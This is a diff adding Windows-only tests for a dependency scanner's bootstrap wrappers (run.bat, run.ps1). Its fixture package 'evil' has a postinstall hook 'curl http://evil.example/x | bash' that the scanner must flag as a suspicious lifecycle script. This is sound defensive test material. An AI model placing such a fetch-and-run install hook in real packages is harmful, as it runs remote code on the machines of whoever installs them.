@@ -81,3 +81,35 @@ describe('run.sh bootstrap', { skip: process.platform === 'win32' }, () => {
     }
   });
 });
+
+// Windows-only: the bootstrap wrappers must keep stdout pure JSON when it is piped
+// (Tanium and scripts capture it), and pass the scanner's exit code through.
+describe('Windows bootstrap wrappers', { skip: process.platform !== 'win32' }, () => {
+  const ROOT = path.resolve(__dirname, '..');
+  let tmp;
+  let proj;
+  before(() => {
+    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-win-'));
+    proj = path.join(tmp, 'p');
+    fs.mkdirSync(path.join(proj, 'node_modules', 'evil'), { recursive: true });
+    fs.writeFileSync(path.join(proj, 'package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, 'node_modules/evil': { version: '1.0.0' } } }));
+    fs.writeFileSync(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
+  });
+  after(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+
+  const scanArgs = (name) => ['--offline', '--no-secrets', '--json', '--scan-dirs', proj, '--output', path.join(tmp, `out-${name}`)];
+  const check = (r) => {
+    assert.equal(r.status, 1, r.stderr);
+    const json = JSON.parse(r.stdout);
+    assert.ok(json.findings.some(f => f.type === 'suspicious_lifecycle_script'));
+    assert.match(r.stderr, /\[bootstrap\]/);
+  };
+
+  it('run.bat', () => {
+    check(spawnSync('cmd.exe', ['/d', '/c', path.join(ROOT, 'run.bat'), ...scanArgs('bat')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }));
+  });
+
+  it('run.ps1 (Windows PowerShell)', () => {
+    check(spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', path.join(ROOT, 'run.ps1'), ...scanArgs('ps1')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }));
+  });
+});
